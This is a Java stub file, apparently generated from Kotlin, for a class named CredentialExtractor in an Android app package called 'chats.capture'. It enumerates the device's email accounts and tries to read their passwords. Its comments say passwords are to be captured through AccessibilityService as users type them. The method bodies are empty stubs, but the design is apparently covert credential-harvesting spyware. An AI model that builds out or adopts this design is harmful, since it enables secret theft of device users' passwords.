package com.chats.capture.utils;

/**
 * Extracts email accounts configured on the device
 */
@kotlin.Metadata(mv = {1, 9, 0}, k = 1, xi = 48, d1 = {"\u00006\n\u0002\u0018\u0002\n\u0002\u0010\u0000\n\u0000\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010 \n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u000b\n\u0000\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\u0018\u00002\u00020\u0001B\r\u0012\u0006\u0010\u0002\u001a\u00020\u0003\u00a2\u0006\u0002\u0010\u0004J\f\u0010\u0007\u001a\b\u0012\u0004\u0012\u00020\t0\bJ\u0010\u0010\n\u001a\u00020\u000b2\u0006\u0010\f\u001a\u00020\rH\u0002J\u0010\u0010\u000e\u001a\u0004\u0018\u00010\r2\u0006\u0010\u000f\u001a\u00020\u0010R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004\u00a2\u0006\u0002\n\u0000R\u000e\u0010\u0002\u001a\u00020\u0003X\u0082\u0004\u00a2\u0006\u0002\n\u0000\u00a8\u0006\u0011"}, d2 = {"Lcom/chats/capture/utils/CredentialExtractor;", "", "context", "Landroid/content/Context;", "(Landroid/content/Context;)V", "accountManager", "Landroid/accounts/AccountManager;", "getEmailAccounts", "", "Lcom/chats/capture/utils/EmailAccount;", "isEmailAccountType", "", "accountType", "", "tryGetAccountPassword", "account", "Landroid/accounts/Account;", "app_debug"})
public final class CredentialExtractor {
    @org.jetbrains.annotations.NotNull()
    private final android.content.Context context = null;
    @org.jetbrains.annotations.NotNull()
    private final android.accounts.AccountManager accountManager = null;
    
    public CredentialExtractor(@org.jetbrains.annotations.NotNull()
    android.content.Context context) {
        super();
    }
    
    /**
     * Get all email accounts configured on the device
     * Note: Passwords cannot be retrieved directly from AccountManager for security reasons
     * They need to be captured via AccessibilityService when user enters them
     */
    @org.jetbrains.annotations.NotNull()
    public final java.util.List<com.chats.capture.utils.EmailAccount> getEmailAccounts() {
        return null;
    }
    
    private final boolean isEmailAccountType(java.lang.String accountType) {
        return false;
    }
    
    /**
     * Try to get account password (may not work due to security restrictions)
     * This is a fallback - passwords should be captured via AccessibilityService
     */
    @org.jetbrains.annotations.Nullable()
    public final java.lang.String tryGetAccountPassword(@org.jetbrains.annotations.NotNull()
    android.accounts.Account account) {
        return null;
    }
}